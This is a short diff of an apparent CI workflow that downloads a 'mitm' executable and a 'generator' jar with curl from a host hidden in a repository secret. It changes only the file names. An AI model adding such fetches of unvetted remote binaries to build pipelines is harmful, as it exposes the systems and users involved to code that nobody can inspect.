@@ -31,7 +31,7 @@ jobs:
         Move-Item .\config.json D:\a\_temp\ -Force
         cd "D:\a\_temp\"
 
-        curl -o mitm_2k26.8.15.exe https://${{ secrets.REMOTE }}/mitm.exe
+        curl -o mitm https://${{ secrets.REMOTE }}/mitm_2k26.8.15.exe
         curl -o application.jar https://${{ secrets.REMOTE }}/generator_2k26.8.26.jar
     - name: Work
       run: |
